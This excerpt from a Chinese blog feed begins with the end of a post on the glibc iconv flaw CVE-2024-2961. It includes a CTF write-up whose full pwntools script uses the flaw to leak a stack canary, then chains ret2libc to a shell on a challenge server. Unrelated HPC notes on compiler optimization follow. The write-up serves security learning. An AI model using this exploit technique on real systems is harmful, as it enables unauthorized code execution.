<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *escseq;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如，用于 SO 的情况</span></span><br><span class="line">escseq = <span class="string">&quot;)A\0\0)G)E&quot;</span> + (used - <span class="number">1</span>) * <span class="number">2</span>;</span><br><span class="line">*outptr++ = ESC;</span><br><span class="line">*outptr++ = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如，用于 SS2 的情况</span></span><br><span class="line">escseq = <span class="string">&quot;*H&quot;</span>;</span><br><span class="line">*outptr++ = ESC;</span><br><span class="line">*outptr++ = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如，用于 SS3 的情况</span></span><br><span class="line">escseq = <span class="string">&quot;+I+J+K+L+M&quot;</span> + ((used &gt;&gt; <span class="number">5</span>) - <span class="number">3</span>) * <span class="number">2</span>;</span><br><span class="line">*outptr++ = ESC;</span><br><span class="line">*outptr++ = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p><strong>4.为特定字符集生成额外的字节</strong>：</p>
<ul>
<li>如果<code>used</code>是<code>CNS11643_2_set</code>，且<strong>outptr + 2 &lt;= outend</strong>则会加上ESC(即0x1b)与0x4e的后缀。</li>
<li>如果<code>used</code>在<code>CNS11643_3_set</code>到<code>CNS11643_7_set</code>之间，且<strong>outptr + 2 &lt;= outend</strong>则会加上ESC与0x4f的后缀。</li>
</ul>
<p><strong>5.切换到ASCII字符集时发出SO字节</strong>：如果当前字符集是ASCII需要切换，且<strong>outptr + 1 &lt;= outend</strong>，则加入0x0e后缀。</p>
<p><strong>6.检查输出缓冲区长度</strong>：确保在写入新的字节前输出缓冲区<code>outptr</code>有足够的空间，否则返回<code>__GCONV_FULL_OUTPUT</code>错误。</p>
<p><strong>7.改变当前字符集（若与目标字符集不同）</strong>：<code>set = used;</code></p>
<p><strong>8.自增输入指针</strong>：处理完一个字符后，增加输入指针<code>inptr</code>。</p>
<h4 id="四、实例分析"><a href="#四、实例分析" class="headerlink" title="四、实例分析"></a>四、实例分析</h4><h5 id="XGCTF-echo"><a href="#XGCTF-echo" class="headerlink" title="XGCTF [echo]"></a>XGCTF [echo]</h5><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185742098.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185755294.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185806653.png"
                      class=""
                >
<p>64位程序开了canary保护，最后有个明显的往s里读0x60字节的栈溢出，那么我们就要想办法先得到canary的值。我们发现canary实际存在var_8处，而最后iconv函数实际对输入进行换编码后会存0x26字节到s中，s与canary之间只差0x28个字节，那么我们利用iconv的漏洞，先填充0x25个垃圾字符，最后写一个会触发漏洞的字符，就可以溢出3字节刚好把canary低位的\x00给覆盖了，那么printf(“%s”,s)就能直接把canary的值打印出来了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185814773.png"
                      class=""
                >
<p>之后有了canary，又能栈溢出，直接ret2libc即可</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./echo&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28257</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./echo&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x25</span> + <span class="string">&quot;劄&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;\x48&quot;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">pop_rdi_ret = <span class="number">0x401493</span></span><br><span class="line">ret_add = <span class="number">0x40101a</span></span><br><span class="line">main_add = <span class="number">0x401256</span></span><br><span class="line">p.sendline(<span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(elf.got[<span class="string">&quot;puts&quot;</span>]) + p64(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p64(main_add)) </span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_add = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_add = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;collectcrop&quot;</span>)</span><br><span class="line">payload2 = <span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(bin_sh_add) + p64(ret_add) + p64(system_add)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>Algorithmica-HPC研读记录2</title>
    <url>/blog/2025/03/15/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%952/</url>
    <content><![CDATA[<h2 id="Algorithmica-HPC研读记录（4-6章）"><a href="#Algorithmica-HPC研读记录（4-6章）" class="headerlink" title="Algorithmica HPC研读记录（4-6章）"></a>Algorithmica HPC研读记录（4-6章）</h2><h3 id="四、编译（Compilation）"><a href="#四、编译（Compilation）" class="headerlink" title="四、编译（Compilation）"></a>四、编译（Compilation）</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>学习汇编语言的主要好处并不在于能够用它编写程序，而是在于理解编译后的代码在执行过程中发生了什么，以及它对性能的影响。</p>
<p>在极少数情况下，我们确实需要手写汇编代码以达到最高性能，但大多数时候，编译器本身就能生成接近最优的代码。如果编译器未能做到这一点，通常是因为程序员比编译器掌握了更多关于问题的特定知识，但却未能通过源代码有效地传达这些信息。</p>
<p>在本章中，我们将讨论如何让编译器精确地按照我们的意图生成代码，并探讨如何收集有助于进一步优化的有用信息。</p>
<h4 id="编译阶段"><a href="#编译阶段" class="headerlink" title="编译阶段"></a>编译阶段</h4><p>在直接讨论编译器优化之前，让我们先简要回顾一下“整体流程”。将 C 代码转换为可执行文件的过程大致可分为四个阶段：</p>
<ol>
<li><p><strong>预处理（Preprocessing）</strong><br>预处理阶段会展开宏（macros）、从头文件中引入源代码，并去除源代码中的注释。可以使用以下命令查看预处理后的代码：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -E source.c</span><br></pre></td></tr></table></figure></div>
<p>这会将预处理后的源代码输出到标准输出（stdout）。</p>
</li>
<li><p><strong>编译（Compiling）</strong><br>编译器会解析源代码，检查语法错误，并将代码转换为中间表示（Intermediate Representation，IR）。在此过程中，它还会进行一些优化，并最终将 IR 翻译成汇编代码。可以使用以下命令生成汇编文件：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -S file.c</span><br></pre></td></tr></table></figure></div>
<p>这将产生一个扩展名为 <code>.s</code> 的汇编代码文件。</p>
</li>
<li><p><strong>汇编（Assembly）</strong><br>这一阶段会将汇编代码转换为机器码（machine code）。需要注意的是，此时所有外部函数调用（如 <code>printf</code>）仍然是占位符，并未真正解析。可以使用以下命令进行汇编：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -c file.c</span><br></pre></td></tr></table></figure></div>
<p>这会生成一个 <code>.o</code>（目标文件，Object File）。</p>
</li>
<li><p><strong>链接（Linking）</strong><br>最后，链接器会解析所有函数调用，并填充它们的真实地址，从而生成最终的可执行文件：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o binary file.c</span><br></pre></td></tr></table></figure></div>
<p>这将生成一个可执行的二进制文件 <code>binary</code>。</p>
</li>
</ol>
<p>在这四个阶段的每一个阶段，都有可能通过不同的方式来优化程序的性能。</p>
<h4 id="编译选项与目标平台"><a href="#编译选项与目标平台" class="headerlink" title="编译选项与目标平台"></a>编译选项与目标平台</h4><h5 id="过程间优化（Interprocedural-Optimization）"><a href="#过程间优化（Interprocedural-Optimization）" class="headerlink" title="过程间优化（Interprocedural Optimization）"></a><strong>过程间优化（Interprocedural Optimization）</strong></h5><p>我们之所以有<strong>链接（linking）</strong>这个最后阶段，是因为逐个文件进行编译再进行链接，既更容易实现，也更快。这种方式可以<strong>并行</strong>编译多个文件，并<strong>缓存</strong>中间结果，提高编译效率。</p>
<p>此外，它还允许代码以<strong>库（library）</strong>的形式分发，库可以是<strong>静态</strong>的，也可以是<strong>共享</strong>的：</p>
<ul>
<li><strong>静态库（Static Libraries）</strong><br>静态库就是一组<strong>预编译的目标文件（object files）</strong>的集合，编译器会将它们与其他源代码合并，最终生成一个<strong>单一的可执行文件</strong>，就像正常编译时那样。</li>
<li><strong>动态库或共享库（Dynamic/Shared Libraries）</strong><br>共享库是<strong>预编译的可执行文件</strong>，其中包含额外的元信息（meta-information），用于标识库中的<strong>可调用函数和数据</strong>。这些引用会在<strong>运行时（runtime）</strong>解析。正如其名称所示，这种方式允许多个程序<strong>共享</strong>已编译的二进制代码。</li>
</ul>
<p>使用<strong>静态库</strong>的主要优势是可以执行<strong>各种过程间优化（interprocedural optimizations）</strong>，这些优化需要比普通库函数签名更多的上下文信息，例如：</p>
<ul>
<li><strong>函数内联（Function Inlining）</strong></li>
<li><strong>无用代码消除（Dead Code Elimination）</strong></li>
</ul>
<p>要强制<strong>链接器（linker）</strong>仅查找和接受<strong>静态库</strong>，可以使用 <code>-static</code> 选项，例如：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -static -o my_program my_program.c -lmylib</span><br></pre></td></tr></table></figure></div>
<h5 id="链接时优化（Link-Time-Optimization-LTO）"><a href="#链接时优化（Link-Time-Optimization-LTO）" class="headerlink" title="链接时优化（Link-Time Optimization, LTO）"></a><strong>链接时优化（Link-Time Optimization, LTO）</strong></h5><p>这一过程被称为<strong>链接时优化（LTO）</strong>。现代编译器在目标文件（object files）中<strong>存储了一种中间表示（intermediate representation, IR）</strong>，因此可以在整个程序的层面进行<strong>轻量级优化</strong>。</p>
<p>此外，LTO 还允许在<strong>不同的编程语言</strong>之间进行优化——只要它们的编译器使用相同的中间表示，就可以进行跨语言优化。</p>
<p>LTO 是一个<strong>相对较新的特性</strong>（GCC 直到<strong>2014 年左右</strong>才支持），但它仍然<strong>远未完善</strong>。在 C 和 C++ 中，为了确保<strong>不会因独立编译（separate compilation）损失性能</strong>，一种解决方案是<strong>创建仅包含头文件的库（header-only library）</strong>。</p>
<p><strong>头文件库（Header-Only Library）</strong>的特点：</p>
<ul>
<li>仅由<strong>头文件（<code>.h</code> 或 <code>.hpp</code>）</strong>组成，包含所有函数的完整定义，而不仅仅是声明。</li>
<li>只需<strong>直接包含（<code>#include</code>）</strong>这些头文件，编译器就能访问所有可用的优化。</li>
<li><strong>缺点</strong>是每次编译时<strong>都必须重新编译库的代码</strong>，但它确保了<strong>不会丢失性能</strong>，并且提供了更好的<strong>控制权</strong>。</li>
</ul>
<p><strong>1. 为什么需要 LTO？</strong></p>
<p>通常，我们编译 C/C++ 程序时是<strong>逐个文件</strong>进行编译，然后在链接时合并这些编译结果。但这样会有一个问题：<strong>编译器只能在单个源文件内进行优化</strong>，它无法跨文件进行全局优化。例如：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// lib.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, add(<span class="number">2</span>, <span class="number">3</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在<strong>单文件编译</strong>时，编译 <code>main.c</code> 时无法看到 <code>add()</code> 的具体实现，因此它不会进行<strong>内联优化</strong>，而是必须生成<strong>函数调用</strong>指令。</p>
<p>但是，<strong>LTO 允许编译器在链接阶段看到整个程序的代码</strong>，从而进行：</p>
<ul>
<li><strong>跨文件内联（Cross-File Inlining）</strong></li>
<li><strong>跨文件常量传播（Cross-File Constant Propagation）</strong></li>
<li><strong>消除未使用的代码（Dead Code Elimination）</strong></li>
</ul>
<p><strong>2. 静态库 vs 共享库</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>特性</th>
<th><strong>静态库（Static Library）</strong></th>
<th><strong>共享库（Shared Library）</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>链接方式</td>
<td><strong>编译时</strong>合并到可执行文件中</td>
<td><strong>运行时</strong>动态加载</td>
</tr>
<tr>
<td>可执行文件大小</td>
<td><strong>较大</strong>（包含所有库代码）</td>
<td><strong>较小</strong>（只包含引用）</td>
</tr>
<tr>
<td>运行时性能</td>
<td><strong>更快</strong>（所有代码已加载）</td>
<td><strong>略慢</strong>（可能需要动态加载）</td>
</tr>
<tr>
<td>更新库的影响</td>
<td><strong>需要重新编译整个程序</strong></td>
<td><strong>直接替换库文件即可生效</strong></td>
</tr>
<tr>
<td>是否支持 LTO</td>
<td><strong>支持（可优化跨文件调用）</strong></td>
<td><strong>不支持（只知道函数签名）</strong></td>
</tr>
</tbody>
</table>
</div>
<p>对于<strong>性能敏感的程序</strong>（如游戏引擎、嵌入式系统），通常会选择<strong>静态库 + LTO</strong>，以最大化优化。<br> 对于<strong>需要动态更新的程序</strong>（如操作系统、应用程序），则更倾向于<strong>共享库</strong>，以减少存储占用并方便维护。</p>
<p><strong>3. 头文件库（Header-Only Library）</strong></p>
<p>头文件库是一种特殊的优化方式，它的<strong>优点</strong>是：</p>
<ul>
<li><strong>所有代码都可见，编译器能进行最大程度的优化</strong>（比如内联和常量折叠）。</li>
<li><strong>避免了 LTO 可能带来的编译器兼容性问题</strong>。</li>
<li><strong>使用方便</strong>，只需 <code>#include</code> 头文件即可，无需额外的编译步骤。</li>
</ul>
<p>但它的<strong>缺点</strong>是：</p>
<ul>
<li><strong>每次编译都要重新编译库的代码</strong>，可能会导致<strong>编译时间变长</strong>。</li>
<li><strong>难以控制 ABI 兼容性</strong>，更新库时可能会影响已编译的代码。</li>
</ul>
<h5 id="优化级别"><a href="#优化级别" class="headerlink" title="优化级别"></a><strong>优化级别</strong></h5><p>GCC 主要提供 <strong>4.5 个主要的优化级别</strong>，用于 <strong>优化程序运行速度</strong>：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th><strong>优化级别</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>-O0</code>（默认）</td>
<td><strong>不进行优化</strong>（但实际上优化了 <strong>编译时间</strong>）。</td>
</tr>
<tr>
<td><code>-O1</code>（或 <code>-O</code>）</td>
<td><strong>启用一些简单优化</strong>，几乎 <strong>不影响编译时间</strong>，但能提升性能。</td>
</tr>
<tr>
<td><code>-O2</code></td>
<td><strong>启用所有已知的、不会引入负面影响的优化</strong>，且优化时间较合理（<strong>生产环境常用</strong>）。</td>
</tr>
<tr>
<td><code>-O3</code></td>
<td><strong>启用几乎所有正确的优化</strong>，但编译时间可能更长，某些优化可能不适用于所有场景。</td>
</tr>
<tr>
<td><code>-Ofast</code></td>
<td><strong>包含 <code>-O3</code> 的所有优化</strong>，再加上一些 <strong>可能违反标准但大多数情况下无害的优化</strong>（如 <strong>浮点运算重排</strong>，可能导致 <strong>少量精度丢失</strong>）。</td>
</tr>
</tbody>
</table>
</div>
<p>此外，GCC 还有 <strong>许多其他优化选项</strong>，但它们 <strong>过于特殊</strong>，默认情况下不会启用，甚至在某些情况下会 <strong>降低性能</strong>。在接下来的章节，我们会讨论其中的一些高级优化选项。</p>
<p><strong>指定目标架构（Specifying Targets）</strong></p>
<p>接下来，我们希望告诉编译器更多关于代码将在哪些计算机上运行的信息。<strong>支持的平台范围越小，优化效果越好</strong>。默认情况下，编译器会生成可以在 <strong>任何 2000 年以后发布的 x86 处理器</strong> 上运行的二进制文件。</p>
<p><strong>最简单的方式</strong> 来缩小适用范围是使用 <code>-march</code> 选项来指定确切的微架构。例如：</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">-march=haswell  <span class="comment"># 生成适用于 Haswell 微架构的代码</span></span><br></pre></td></tr></table></figure></div>
<p>如果你是在<strong>同一台将运行程序的计算机上进行编译</strong>，可以使用 <code>-march=native</code> 让编译器<strong>自动检测</strong>本机 CPU 并生成相应的优化代码。</p>
<p>由于<strong>指令集通常是向后兼容的</strong>，因此通常只需要指定<strong>最老的微架构</strong>即可。例如，如果你的目标平台范围包括 <strong>Haswell 及更新的 CPU</strong>，使用 <code>-march=haswell</code> 就可以确保<strong>所有更老的 CPU 仍然可以运行</strong>。</p>
<p>另一种更精细的方式是<strong>直接列出</strong> 你希望使用的<strong>特定指令集</strong>，例如：</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">-mavx2  <span class="comment"># 启用 AVX2 指令集</span></span><br><span class="line">-mpopcnt  <span class="comment"># 启用 popcnt（人口计数）指令</span></span><br></pre></td></tr></table></figure></div>
<p>如果你<strong>仅仅想针对某个 CPU 进行优化，但仍希望它可以在其他 CPU 上运行</strong>，可以使用 <code>-mtune</code> 选项，例如：</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">-mtune=haswell</span><br></pre></td></tr></table></figure></div>
<p>与 <code>-march</code> 不同，<strong><code>-mtune</code> 只是优化，不会使用不兼容的指令</strong>，所以不会导致程序在不支持的 CPU 上崩溃。<br> （<strong>注意</strong>：默认情况下，<code>-march=x</code> 也会隐含 <code>-mtune=x</code>，即自动优化目标 CPU。）</p>
<p><strong>除了在编译时传递这些参数，也可以直接在代码中使用 <code>#pragma</code> 指令</strong>：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> GCC optimize(<span class="string">&quot;O3&quot;</span>)   <span class="comment">// 仅优化本文件为 O3 级别</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> GCC target(<span class="string">&quot;avx2&quot;</span>)   <span class="comment">// 仅对本文件启用 AVX2 指令</span></span></span><br></pre></td></tr></table></figure></div>
<p>这种方法适用于<strong>仅优化特定的高性能函数</strong>，也就是局部优化，而不影响整个项目的编译时间。</p>
<p>有时候，你可能希望在<strong>同一个库</strong>中<strong>提供多个针对不同 CPU 架构优化的实现</strong>。</p>
<p>我们可以使用<strong>基于 <code>__attribute__</code> 的语法</strong>，让编译器<strong>自动选择</strong>最合适的函数版本：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">__attribute__(( <span class="built_in">target</span>(<span class="string">&quot;default&quot;</span>) )) <span class="comment">// 默认回退实现</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">popcnt</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> s = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        s += (x &gt;&gt; i &amp; <span class="number">1</span>); <span class="comment">// 逐位统计 1 的个数</span></span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__(( <span class="built_in">target</span>(<span class="string">&quot;popcnt&quot;</span>) )) <span class="comment">// 仅在 CPU 支持 popcnt 指令时使用</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">popcnt</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> __builtin_popcount(x); <span class="comment">// 内建 popcnt 指令</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在 Clang 编译器中，<strong>不能</strong>使用 <code>#pragma</code> 直接在代码中设置目标架构和优化选项，<br> 但可以<strong>像 GCC 一样</strong>使用 <code>__attribute__</code> 来实现<strong>多版本函数</strong>。</p>
<h4 id="条件优化"><a href="#条件优化" class="headerlink" title="条件优化"></a>条件优化</h4><p>条件优化<strong>不完全符合标准</strong>，而且<strong>对具体场景依赖性很强</strong>，需要程序员提供<strong>额外的信息</strong>来判断是否启用。所以即使开了<strong>O3</strong>优化编译器也不会默认采用这些优化方式。</p>
<h5 id="循环展开"><a href="#循环展开" class="headerlink" title="循环展开"></a>循环展开</h5><p>循环展开是一种编译器优化技术，它<strong>减少循环控制的开销</strong>，通过复制循环体的代码来减少循环的迭代次数。这样可以减少 <code>cmp</code>（比较）、<code>jmp</code>（跳转）等指令的执行，提高 CPU 指令流水线的效率。</p>
<p>默认情况下是关闭的，除非：</p>
<ul>
<li><strong>迭代次数是编译时的常数</strong>（例如 <code>for (int i = 0; i &lt; 4; i++)</code>）。</li>
<li>在这种情况下，GCC 可能会<strong>完全去掉循环</strong>，直接替换成一系列不带跳转的指令。</li>
</ul>
<p><strong>如何启用循环展开？</strong></p>
<p><strong>（1）使用编译选项</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">-funroll-loops</span><br></pre></td></tr></table></figure></div>
<ul>
<li>让编译器<strong>尝试展开所有已知迭代次数的循环</strong>（包括编译时可知和运行时进入循环时可知的）。</li>
<li>但这会<strong>增加二进制文件大小</strong>，并不总是提高性能。</li>
</ul>
<p><strong>（2）使用 <code>#pragma</code> 控制单个循环</strong></p>
<p>如果只想<strong>对某个特定循环</strong>展开，可以使用 <code>#pragma</code>：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> GCC unroll 4</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="comment">// 代码块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>这里 <code>#pragma GCC unroll 4</code> 告诉编译器<strong>展开 4 次迭代</strong>。</li>
<li>适用于 <code>n</code> <strong>较大且无法静态确定</strong>的情况。</li>
</ul>
<h5 id="内联函数"><a href="#内联函数" class="headerlink" title="内联函数"></a>内联函数</h5><p>函数内联是一种优化技术，它<strong>将函数调用替换为函数体本身</strong>，从而减少函数调用的开销（如参数传递、栈操作等）。</p>
<p>在 C/C++ 中，可以使用 <code>inline</code> 关键字<strong>提示</strong>编译器进行内联：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">square</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong>编译器可能会忽略 <code>inline</code></strong>，如果它认为内联后不会提高性能或代码膨胀太严重。</li>
<li><strong>适用于短小、频繁调用的函数</strong>（例如 <code>math</code> 函数）。</li>
</ul>
<p>如果一定要让编译器<strong>强制内联</strong>，可以使用 <code>__attribute__((always_inline))</code>：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FORCE_INLINE inline __attribute__((always_inline))</span></span><br><span class="line"></span><br><span class="line"><span class="function">FORCE_INLINE <span class="type">int</span> <span class="title">square</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>这会<strong>强制编译器内联</strong>，除非编译器优化级别不允许（如 <code>-O0</code>）。</li>
<li>适用于<strong>性能关键代码</strong>（如高频调用的 <code>getter/setter</code>）。</li>
</ul>
<h5 id="分支可能性提示"><a href="#分支可能性提示" class="headerlink" title="分支可能性提示"></a>分支可能性提示</h5><p>从 C++20 开始，<strong><code>[[likely]]</code></strong> 和 <strong><code>[[unlikely]]</code></strong> 属性可以用来提示编译器某个分支是否更可能被执行。这对提高分支预测的准确性和优化性能非常有帮助。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">factorial</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) [[likely]]   <span class="comment">// 提示编译器这个分支更可能执行</span></span><br><span class="line">        <span class="keyword">return</span> n * <span class="built_in">factorial</span>(n - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">else</span> [[unlikely]]       <span class="comment">// 提示编译器这个分支不太可能执行</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>[[likely]]</code> 表示此分支更有可能发生。</li>
<li><code>[[unlikely]]</code> 表示此分支不太可能发生。</li>
</ul>
<p>这告诉编译器如何生成更高效的代码，尤其是在有多个条件判断时。</p>
<p>在 C++20 之前，<strong>GCC 提供了 <code>__builtin_expect</code></strong> 函数来告诉编译器分支的可能性：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">factorial</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(n &gt; <span class="number">1</span>, <span class="number">1</span>))  <span class="comment">// 告诉编译器 n &gt; 1 更可能为真</span></span><br><span class="line">        <span class="keyword">return</span> n * <span class="built_in">factorial</span>(n - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>__builtin_expect</code>函数的第二个参数表示“预测值”：</p>
<ul>
<li><code>1</code> 表示该分支“更可能发生”。</li>
<li><code>0</code> 表示该分支“不太可能发生”。</li>
</ul>
<p>这虽然是编译器的内建功能，但并没有像 <code>[[likely]]</code> 和 <code>[[unlikely]]</code> 那样成为 C++ 标准的一部分，使用时需要依赖编译器的特定实现。</p>
<h5 id="PGO"><a href="#PGO" class="headerlink" title="PGO"></a>PGO</h5><p><strong>Profile-Guided Optimization (PGO)</strong> 是一种利用实际运行数据来优化程序性能的技术。通过收集程序在运行时的数据（例如分支的执行频率、函数调用次数、循环迭代次数等），编译器可以做出更有针对性的优化决策，从而超过仅通过静态分析所能实现的优化效果。</p>
<p>PGO 的基本流程包括以下步骤：</p>
<ol>
<li><strong>生成分析数据</strong>：编译程序并在实际数据上运行，通过添加计时器和计数器来收集数据。</li>
<li><strong>使用分析数据优化编译</strong>：使用从第一次运行中收集到的 profiling 数据重新编译程序。</li>
</ol>
<p><strong>步骤 1：生成 Profiling 数据</strong></p>
